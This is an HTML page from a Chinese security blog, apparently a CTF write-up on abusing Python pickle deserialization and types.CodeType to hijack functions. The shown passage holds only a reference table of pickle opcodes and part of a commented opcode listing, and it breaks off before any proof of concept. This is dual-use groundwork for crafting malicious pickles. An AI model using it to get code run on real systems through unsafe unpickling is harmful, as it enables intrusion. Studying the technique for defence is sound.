@@ -1,0 +1,1373 @@
+<!DOCTYPE html>
+<html lang="zh" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>pickle&amp;types.CodeType实现接管任意函数 | Jiecub3</title>
+<meta name="keywords" content="">
+<meta name="description" content="参考：https://xz.aliyun.com/t/7436?time__1311=n4%2BxnD0Dy7GQDt%3DG%3DGCDl">
+<meta name="author" content="Jiecub3">
+<link rel="canonical" href="https://Jiecub3.github.io/zh/posts/python/pickletypes.codetype%E5%AE%9E%E7%8E%B0%E6%8E%A5%E7%AE%A1%E4%BB%BB%E6%84%8F%E5%87%BD%E6%95%B0/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.6498a9db1bad4c0d045c3aa5ba217809694eb596cf8fff3516fcb871a2dfe03e.css" integrity="sha256-ZJip2xutTA0EXDqluiF4CWlOtZbPj/81Fvy4caLf4D4=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://Jiecub3.github.io/img/logo.gif">
+<link rel="icon" type="image/png" sizes="16x16" href="https://Jiecub3.github.io/img/logo.gif">
+<link rel="icon" type="image/png" sizes="32x32" href="https://Jiecub3.github.io/img/logo.gif">
+<link rel="apple-touch-icon" href="https://Jiecub3.github.io/logo.gif">
+<link rel="mask-icon" href="https://Jiecub3.github.io/logo.gif">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="zh" href="https://Jiecub3.github.io/zh/posts/python/pickletypes.codetype%E5%AE%9E%E7%8E%B0%E6%8E%A5%E7%AE%A1%E4%BB%BB%E6%84%8F%E5%87%BD%E6%95%B0/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript><meta property="og:title" content="pickle&amp;types.CodeType实现接管任意函数" />
+<meta property="og:description" content="参考：https://xz.aliyun.com/t/7436?time__1311=n4%2BxnD0Dy7GQDt%3DG%3DGCDl" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://Jiecub3.github.io/zh/posts/python/pickletypes.codetype%E5%AE%9E%E7%8E%B0%E6%8E%A5%E7%AE%A1%E4%BB%BB%E6%84%8F%E5%87%BD%E6%95%B0/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-12-31T20:01:23+08:00" />
+<meta property="article:modified_time" content="2024-12-31T20:01:23+08:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="pickle&amp;types.CodeType实现接管任意函数"/>
+<meta name="twitter:description" content="参考：https://xz.aliyun.com/t/7436?time__1311=n4%2BxnD0Dy7GQDt%3DG%3DGCDl"/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://Jiecub3.github.io/zh/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "pickle\u0026types.CodeType实现接管任意函数",
+      "item": "https://Jiecub3.github.io/zh/posts/python/pickletypes.codetype%E5%AE%9E%E7%8E%B0%E6%8E%A5%E7%AE%A1%E4%BB%BB%E6%84%8F%E5%87%BD%E6%95%B0/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "pickle\u0026types.CodeType实现接管任意函数",
+  "name": "pickle\u0026types.CodeType实现接管任意函数",
+  "description": "参考：https://xz.aliyun.com/t/7436?time__1311=n4%2BxnD0Dy7GQDt%3DG%3DGCDl",
+  "keywords": [
+    
+  ],
+  "articleBody": " 参考：https://xz.aliyun.com/t/7436?time__1311=n4%2BxnD0Dy7GQDt%3DG%3DGCDlhjeP7Ki%3D%3DWhbCCeC84D#toc-4\n这篇文章给我很大帮助，很感谢这篇文章，前一天我也是对pickle一窍不通，虽然早就接触过但都是脚本小子，正巧有道题引起了我，让我慢慢道来，让你一文速通pickle\n重点还是types.CodeType，但是pickle是基础\n前置知识 前置知识都搬参考文章的\n指令 描述 具体写法 栈上的变化 c 获取一个全局对象或import一个模块 c[module]\\n[instance]\\n 获得的对象入栈 o 寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象） o 这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈 i 相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象） i[module]\\n[callable]\\n 这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈 N 实例化一个None N 获得的对象入栈 S 实例化一个字符串对象 S’xxx’\\n（也可以使用双引号、'等python字符串形式） 获得的对象入栈 V 实例化一个UNICODE字符串对象 Vxxx\\n 获得的对象入栈 I 实例化一个int对象 Ixxx\\n 获得的对象入栈 F 实例化一个float对象 Fx.x\\n 获得的对象入栈 R 选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数 R 函数和参数出栈，函数的返回值入栈 . 程序结束，栈顶的一个元素作为pickle.loads()的返回值 . 无 ( 向栈中压入一个MARK标记 ( MARK标记入栈 t 寻找栈中的上一个MARK，并组合之间的数据为元组 t MARK标记以及被组合的数据出栈，获得的对象入栈 ) 向栈中直接压入一个空元组 ) 空元组入栈 l 寻找栈中的上一个MARK，并组合之间的数据为列表 l MARK标记以及被组合的数据出栈，获得的对象入栈 ] 向栈中直接压入一个空列表 ] 空列表入栈 d 寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对） d MARK标记以及被组合的数据出栈，获得的对象入栈 } 向栈中直接压入一个空字典 } 空字典入栈 p 将栈顶对象储存至memo_n pn\\n 无 g 将memo_n的对象压栈 gn\\n 对象被压栈 0 丢弃栈顶对象 0 栈顶对象被丢弃 b 使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置 b 栈上第一个元素出栈 s 将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中 s 第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新 u 寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中 u MARK标记以及被组合的数据出栈，字典被更新 a 将栈的第一个元素append到第二个元素(列表)中 a 栈顶元素出栈，第二个元素（列表）被更新 e 寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中 e MARK标记以及被组合的数据出栈，列表被更新 不太看得懂序列化的数据，不理解的可以看下面两个动图，很快就理解了，还不太理解可以再看看参考文章的demo，反正这个地方你要完全能看懂序列化的poc\n比较全的指令集 # Pickle opcodes. See pickletools.py for extensive docs. The listing # here is in kind-of alphabetical order of 1-character pickle code. # pickletools groups them by purpose. # 说明: # 1.如果对栈顶元素只说了取出,而没有说弹出的话那就说明只是将栈顶元素复制一份放到一个变量或者就是后面的操作对栈顶元素进行更新修改,但是这个栈顶元素是不会弹出的 # 2.部分说明中对数据进行操作先弹出然后进行操作再进行压栈,但是对照源码可能是对栈数组直接进行直接截取而并没有pop弹出或者append的压栈操作,我这里描述为弹出和压栈的过程是为了便于理解 # 3.用于指定后面需要读取的数据大小的字节读出来之后,有可能是按照字符字面大小读取,也可能是按照其16进制大小进行数据读取,例如字符'1'='\\x31',0x31=49可能是读取1字节大小也肯能是读取49字节大小,注意我的注释描述 # 4._struct.unpack解压",
+  "wordCount" : "11476",
+  "inLanguage": "zh",
+  "datePublished": "2024-12-31T20:01:23+08:00",
+  "dateModified": "2024-12-31T20:01:23+08:00",
+  "author":{
+    "@type": "Person",
+    "name": "Jiecub3"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://Jiecub3.github.io/zh/posts/python/pickletypes.codetype%E5%AE%9E%E7%8E%B0%E6%8E%A5%E7%AE%A1%E4%BB%BB%E6%84%8F%E5%87%BD%E6%95%B0/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Jiecub3",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://Jiecub3.github.io/img/logo.gif"
+    }
+  }
+}
+</script>
+</head>
+
+<body class=" dark" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://Jiecub3.github.io/zh/" accesskey="h" title="Jiecub3 (Alt + H)">Jiecub3</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://Jiecub3.github.io/zh/" title="首页">
+                    <span>首页</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://Jiecub3.github.io/zh/archives/" title="归档">
+                    <span>归档</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://Jiecub3.github.io/zh/categories/" title="分类">
+                    <span>分类</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://Jiecub3.github.io/zh/search" title="搜索🔍︎">
+                    <span>搜索🔍︎</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://Jiecub3.github.io/zh/about/" title="关于">
+                    <span>关于</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://Jiecub3.github.io/zh/">🏠主页</a>&nbsp;»&nbsp;<a href="https://Jiecub3.github.io/zh/posts/">Posts</a></div>
+    <h1 class="post-title entry-hint-parent">
+      pickle&amp;types.CodeType实现接管任意函数
+    </h1>
+    <div class="post-meta"><span title='2024-12-31 20:01:23 +0800 CST'>2024-12-31</span>&nbsp;·&nbsp;23 分钟&nbsp;·&nbsp;Jiecub3
+
+</div>
+  </header> <aside id="toc-container" class="toc-container wide">
+    <div class="toc">
+        <details  open>
+            <summary accesskey="c" title="(Alt + C)">
+                <span class="details">目录</span>
+            </summary>
+
+            <div class="inner"><ul><ul>
+                    <li>
+                        <a href="#%e5%89%8d%e7%bd%ae%e7%9f%a5%e8%af%86" aria-label="前置知识">前置知识</a><ul>
+                            
+                    <li>
+                        <a href="#%e6%af%94%e8%be%83%e5%85%a8%e7%9a%84%e6%8c%87%e4%bb%a4%e9%9b%86" aria-label="比较全的指令集">比较全的指令集</a></li>
+                    <li>
+                        <a href="#%e5%b0%8fdemo" aria-label="小demo">小demo</a></li></ul>
+                    </li>
+                    <li>
+                        <a href="#typescodetype" aria-label="types.CodeType">types.CodeType</a><ul>
+                            
+                    <li>
+                        <a href="#pickle-demo" aria-label="pickle demo">pickle demo</a></li></ul>
+                    </li>
+                    <li>
+                        <a href="#%e4%be%8b%e9%a2%98-const_python" aria-label="例题 const_python">例题 const_python</a><ul>
+                            
+                    <li>
+                        <a href="#%e8%b0%83%e8%af%95demo" aria-label="调试demo">调试demo</a></li></ul>
+                    </li></ul>
+                        
+                    <li>
+                        <a href="#%e5%ae%9e%e7%8e%b0%e6%8e%a5%e7%ae%a1%e4%bb%bb%e6%84%8f%e5%87%bd%e6%95%b0" aria-label="[*]实现接管任意函数">[*]实现接管任意函数</a><ul>
+                            <ul>
+                            
+                    <li>
+                        <a href="#co_code-%e8%a7%a3%e5%86%b3" aria-label="co_code 解决">co_code 解决</a></li></ul>
+                        
+                    <li>
+                        <a href="#end-poc" aria-label="end poc">end poc</a></li>
+                    <li>
+                        <a href="#%e9%9d%9e%e9%a2%84%e6%9c%9f" aria-label="非预期">非预期</a><ul>
+                            
+                    <li>
+                        <a href="#pker" aria-label="pker">pker</a></li>
+                    <li>
+                        <a href="#dis" aria-label="dis">dis</a></li></ul>
+                    </li>
+                    <li>
+                        <a href="#%e6%80%bb%e7%bb%93" aria-label="总结">总结</a><ul>
+                            
+                    <li>
+                        <a href="#%e5%88%a9%e7%94%a8" aria-label="利用">利用</a></li>
+                    <li>
+                        <a href="#typescodetype-%e5%88%a9%e7%94%a8" aria-label="types.CodeType 利用">types.CodeType 利用</a></li></ul>
+                    </li>
+                    <li>
+                        <a href="#%e9%a2%98%e7%9b%ae%e6%ba%90%e7%a0%81" aria-label="题目源码">题目源码</a>
+                    </li>
+                </ul>
+                </li>
+                </ul>
+            </div>
+        </details>
+    </div>
+</aside>
+<script>
+    let activeElement;
+    let elements;
+    
+    document.addEventListener('DOMContentLoaded', function (event) {
+        checkTocPosition();
+    
+        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
+        if (elements.length > 0) {
+            
+            activeElement = elements[0];
+            const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
+            document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
+        }
+    
+        
+        const topLink = document.getElementById('top-link');
+        if (topLink) {
+            topLink.addEventListener('click', (event) => {
+                
+                event.preventDefault();
+    
+                
+                window.scrollTo({ top: 0, behavior: 'smooth' });
+            });
+        }
+    }, false);
+    
+    window.addEventListener('resize', function(event) {
+        checkTocPosition();
+    }, false);
+    
+    window.addEventListener('scroll', () => {
+        
+        const scrollPosition = window.pageYOffset || document.documentElement.scrollTop;
+    
+        
+        if (scrollPosition === 0) {
+            return;
+        }
+    
+        
+        if (elements && elements.length > 0) {
+            
+            activeElement = Array.from(elements).find((element) => {
+                if ((getOffsetTop(element) - scrollPosition) > 0 && 
+                    (getOffsetTop(element) - scrollPosition) < window.innerHeight / 2) {
+                    return element;
+                }
+            }) || activeElement;
+    
+            elements.forEach(element => {
+                const id = encodeURI(element.getAttribute('id')).toLowerCase();
+                const tocLink = document.querySelector(`.inner ul li a[href="#${id}"]`);
+                if (element === activeElement){
+                    tocLink.classList.add('active');
+    
+                    
+                    const tocContainer = document.querySelector('.toc .inner');
+                    const linkOffsetTop = tocLink.offsetTop;
+                    const containerHeight = tocContainer.clientHeight;
+                    const linkHeight = tocLink.clientHeight;
+    
+                    
+                    const scrollPosition = linkOffsetTop - (containerHeight / 2) + (linkHeight / 2);
+                    tocContainer.scrollTo({ top: scrollPosition, behavior: 'smooth' });
+                } else {
+                    tocLink.classList.remove('active');
+                }
+            });
+        }
+    }, false);
+    
+    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
+    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
+    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);
+    
+    function checkTocPosition() {
+        const width = document.body.scrollWidth;
+    
+        if (width - main - (toc * 2) - (gap * 4) > 0) {
+            document.getElementById("toc-container").classList.add("wide");
+        } else {
+            document.getElementById("toc-container").classList.remove("wide");
+        }
+    }
+    
+    function getOffsetTop(element) {
+        if (!element.getClientRects().length) {
+            return 0;
+        }
+        let rect = element.getBoundingClientRect();
+        let win = element.ownerDocument.defaultView;
+        return rect.top + win.pageYOffset;   
+    }
+    
+</script>
+
+  <div class="post-content"><blockquote>
+<p>参考：https://xz.aliyun.com/t/7436?time__1311=n4%2BxnD0Dy7GQDt%3DG%3DGCDlhjeP7Ki%3D%3DWhbCCeC84D#toc-4</p>
+<p>这篇文章给我很大帮助，很感谢这篇文章，前一天我也是对pickle一窍不通，虽然早就接触过但都是脚本小子，正巧有道题引起了我，让我慢慢道来，让你一文速通pickle</p>
+<p>重点还是<code>types.CodeType</code>，但是pickle是基础</p>
+</blockquote>
+<h2 id="前置知识">前置知识<a hidden class="anchor" aria-hidden="true" href="#前置知识">#</a></h2>
+<blockquote>
+<p>前置知识都搬参考文章的</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th>指令</th>
+<th>描述</th>
+<th>具体写法</th>
+<th>栈上的变化</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>c</td>
+<td>获取一个全局对象或import一个模块</td>
+<td>c[module]\n[instance]\n</td>
+<td>获得的对象入栈</td>
+</tr>
+<tr>
+<td>o</td>
+<td>寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）</td>
+<td>o</td>
+<td>这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈</td>
+</tr>
+<tr>
+<td>i</td>
+<td>相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</td>
+<td>i[module]\n[callable]\n</td>
+<td>这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈</td>
+</tr>
+<tr>
+<td>N</td>
+<td>实例化一个None</td>
+<td>N</td>
+<td>获得的对象入栈</td>
+</tr>
+<tr>
+<td>S</td>
+<td>实例化一个字符串对象</td>
+<td>S&rsquo;xxx&rsquo;\n（也可以使用双引号、'等python字符串形式）</td>
+<td>获得的对象入栈</td>
+</tr>
+<tr>
+<td>V</td>
+<td>实例化一个UNICODE字符串对象</td>
+<td>Vxxx\n</td>
+<td>获得的对象入栈</td>
+</tr>
+<tr>
+<td>I</td>
+<td>实例化一个int对象</td>
+<td>Ixxx\n</td>
+<td>获得的对象入栈</td>
+</tr>
+<tr>
+<td>F</td>
+<td>实例化一个float对象</td>
+<td>Fx.x\n</td>
+<td>获得的对象入栈</td>
+</tr>
+<tr>
+<td>R</td>
+<td>选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数</td>
+<td>R</td>
+<td>函数和参数出栈，函数的返回值入栈</td>
+</tr>
+<tr>
+<td>.</td>
+<td>程序结束，栈顶的一个元素作为pickle.loads()的返回值</td>
+<td>.</td>
+<td>无</td>
+</tr>
+<tr>
+<td>(</td>
+<td>向栈中压入一个MARK标记</td>
+<td>(</td>
+<td>MARK标记入栈</td>
+</tr>
+<tr>
+<td>t</td>
+<td>寻找栈中的上一个MARK，并组合之间的数据为元组</td>
+<td>t</td>
+<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
+</tr>
+<tr>
+<td>)</td>
+<td>向栈中直接压入一个空元组</td>
+<td>)</td>
+<td>空元组入栈</td>
+</tr>
+<tr>
+<td>l</td>
+<td>寻找栈中的上一个MARK，并组合之间的数据为列表</td>
+<td>l</td>
+<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
+</tr>
+<tr>
+<td>]</td>
+<td>向栈中直接压入一个空列表</td>
+<td>]</td>
+<td>空列表入栈</td>
+</tr>
+<tr>
+<td>d</td>
+<td>寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对）</td>
+<td>d</td>
+<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
+</tr>
+<tr>
+<td>}</td>
+<td>向栈中直接压入一个空字典</td>
+<td>}</td>
+<td>空字典入栈</td>
+</tr>
+<tr>
+<td>p</td>
+<td>将栈顶对象储存至memo_n</td>
+<td>pn\n</td>
+<td>无</td>
+</tr>
+<tr>
+<td>g</td>
+<td>将memo_n的对象压栈</td>
+<td>gn\n</td>
+<td>对象被压栈</td>
+</tr>
+<tr>
+<td>0</td>
+<td>丢弃栈顶对象</td>
+<td>0</td>
+<td>栈顶对象被丢弃</td>
+</tr>
+<tr>
+<td>b</td>
+<td>使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置</td>
+<td>b</td>
+<td>栈上第一个元素出栈</td>
+</tr>
+<tr>
+<td>s</td>
+<td>将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中</td>
+<td>s</td>
+<td>第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新</td>
+</tr>
+<tr>
+<td>u</td>
+<td>寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中</td>
+<td>u</td>
+<td>MARK标记以及被组合的数据出栈，字典被更新</td>
+</tr>
+<tr>
+<td>a</td>
+<td>将栈的第一个元素append到第二个元素(列表)中</td>
+<td>a</td>
+<td>栈顶元素出栈，第二个元素（列表）被更新</td>
+</tr>
+<tr>
+<td>e</td>
+<td>寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中</td>
+<td>e</td>
+<td>MARK标记以及被组合的数据出栈，列表被更新</td>
+</tr>
+</tbody>
+</table>
+<p>不太看得懂<code>序列化的数据</code>，不理解的可以看下面两个动图，很快就理解了，还不太理解可以再看看参考文章的demo，反正这个地方你要完全能看懂<code>序列化的poc</code></p>
+<p><img loading="lazy" src="images/20200320230631-6204866e-6abc-1.gif" alt="img"  />
+</p>
+<p><img loading="lazy" src="images/20200320230711-7972c0ea-6abc-1.gif" alt="img"  />
+</p>
+<h3 id="比较全的指令集">比较全的指令集<a hidden class="anchor" aria-hidden="true" href="#比较全的指令集">#</a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="c1"># Pickle opcodes.  See pickletools.py for extensive docs.  The listing</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># here is in kind-of alphabetical order of 1-character pickle code.</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># pickletools groups them by purpose.</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 说明:</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 1.如果对栈顶元素只说了取出,而没有说弹出的话那就说明只是将栈顶元素复制一份放到一个变量或者就是后面的操作对栈顶元素进行更新修改,但是这个栈顶元素是不会弹出的</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 2.部分说明中对数据进行操作先弹出然后进行操作再进行压栈,但是对照源码可能是对栈数组直接进行直接截取而并没有pop弹出或者append的压栈操作,我这里描述为弹出和压栈的过程是为了便于理解</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 3.用于指定后面需要读取的数据大小的字节读出来之后,有可能是按照字符字面大小读取,也可能是按照其16进制大小进行数据读取,例如字符&#39;1&#39;=&#39;\x31&#39;,0x31=49可能是读取1字节大小也肯能是读取49字节大小,注意我的注释描述</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 4._struct.unpack解压&lt;i格式数据的时候需要传入4字节大小的数据,然后会把4个字节左右顺序调换,得到一个8位的16进制数,最后将其转为一个10进制整数,例如_struct.unpack(&#39;&lt;i&#39;, b&#39;\x00\x01\x00\x00&#39;)[0]=&gt;0x00001000=&gt;256</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 5.struct.unpack解压&lt;Q格式数据则是需要传入8字节大小数据,转换操作同上,例如unpack(&#39;&lt;Q&#39;, b&#39;\x00\x01\x00\x00\x00\x00\x00\x00&#39;)[0] =&gt; 0x0000000000000100 =&gt; 256</span>
+</span></span><span class="line"><span class="cl"><span class="n">MARK</span>           <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;(&#39;</span>   <span class="c1">#向栈中压入一个Mark标记</span>
+</span></span><span class="line"><span class="cl"><span class="n">STOP</span>           <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;.&#39;</span>   <span class="c1">#相当于停止当前的反序列化过程</span>
+</span></span><span class="line"><span class="cl"><span class="n">POP</span>            <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;0&#39;</span>   <span class="c1">#从栈中pop出一个元素,就是删除栈顶元素</span>
+</span></span><span class="line"><span class="cl"><span class="n">POP_MARK</span>       <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;1&#39;</span>   <span class="c1">#从栈中不断pop元素直到遇到Mark标记</span>
+</span></span><span class="line"><span class="cl"><span class="n">DUP</span>            <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;2&#39;</span>   <span class="c1">#向栈中再压入一个当前的栈顶元素,就是复制一份当前栈顶元素然后进行压栈</span>
+</span></span><span class="line"><span class="cl"><span class="n">FLOAT</span>          <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;F&#39;</span>   <span class="c1">#读取当前行到行末尾,然后转为float类型,向栈中压入一个float浮点数</span>
+</span></span><span class="line"><span class="cl"><span class="n">INT</span>            <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;I&#39;</span>   <span class="c1">#向栈中压入一个int整数,整数就是当前行的最后一个字节,不过如果整数为01的时候压入的是True,为00的时候压入的是False</span>
+</span></span><span class="line"><span class="cl"><span class="n">BININT</span>         <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;J&#39;</span>   <span class="c1">#从后面的输入中读取4个字节并且使用unpack通过&#39;&lt;i&#39;的格式将4字节的buffer数据解包转为int类型,后面不能换行,直接家下一步的操作b&#34;(S&#39;a&#39;\nK\x01\x01\x01\x01.&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">BININT1</span>        <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;K&#39;</span>   <span class="c1">#和上面BININT一样,不过K操作只读取一个字节的数据b&#34;(S&#39;a&#39;\nK\x01.&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">LONG</span>           <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;L&#39;</span>   <span class="c1">#读取当前行到行末尾,然后转为int类型,但如果后面是字符L的话会先去掉最后一个字符L再转int</span>
+</span></span><span class="line"><span class="cl"><span class="n">BININT2</span>        <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;M&#39;</span>   <span class="c1">#从后面的输入中读取2个字节并且使用unpack通过&#39;&lt;H&#39;的格式将2字节的buffer作为一个2进制数解包为int,后面不能换行,直接加下一步的操作b&#34;(S&#39;a&#39;\nM\x01\x01.&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">NONE</span>           <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;N&#39;</span>   <span class="c1">#向栈中压入一个None元素,后面不能换行,直接加下一步的操作b&#34;(S&#39;a&#39;\nN.&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">PERSID</span>         <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;P&#39;</span>   <span class="c1">#读取当前行到行末尾,将读取到的数据作为id,通过persistent_load函数获得obj对象返回后将obj对象压栈,默认情况没用,要重写persistent_load函数才能生效</span>
+</span></span><span class="line"><span class="cl"><span class="n">BINPERSID</span>      <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;Q&#39;</span>   <span class="c1">#和上面作用一样,从当前栈中弹出一个元素作为id,通过persistent_load...</span>
+</span></span><span class="line"><span class="cl"><span class="n">REDUCE</span>         <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;R&#39;</span>   <span class="c1">#从当前栈中弹出两次元素,第一次是函数参数args,第二次是函数func,执行func(args)</span>
+</span></span><span class="line"><span class="cl"><span class="n">STRING</span>         <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;S&#39;</span>   <span class="c1">#向栈中压入一个string字符串,内容就是后面的数据,后面的字符串第一个和最后一个必须是单引号b&#34;(S&#39;a&#39;\nS&#39;&#39;a&#39;&#39;\n.&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">BINSTRING</span>      <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;T&#39;</span>   <span class="c1">#从后面数据读取4字节数据,通过unpack使用&lt;i格式将数据解压后变为int类型, 然后将其作为一个长度, 后面读取这个指定长度的数据作为字符串进行压栈b&#34;(S&#39;a&#39;\nT\x10\x00\x00\x000123456789abcdef.&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># _struct.unpack(&#39;&lt;i&#39;, b&#34;\x10\x00\x00\x00&#34;) =&gt; (16,)</span>
+</span></span><span class="line"><span class="cl"><span class="n">SHORT_BINSTRING</span><span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;U&#39;</span>   <span class="c1">#先读取一个字节数据作为长度,然后按照这个长度读取字符串,读出的字符串压栈</span>
+</span></span><span class="line"><span class="cl"><span class="n">UNICODE</span>        <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;V&#39;</span>   <span class="c1">#读出当前行后面的全部数据,然后进行Unicode解码,将解码内容压栈b&#39;V\\u0061\n.&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">BINUNICODE</span>     <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;X&#39;</span>   <span class="c1">#读出4字节数据通过unpack使用&lt;I格式解压,将解压得到的数据作为长度,然后进行数据读取b&#39;X\x10\x00\x00\x00abcdef0123456789.&#39;</span>
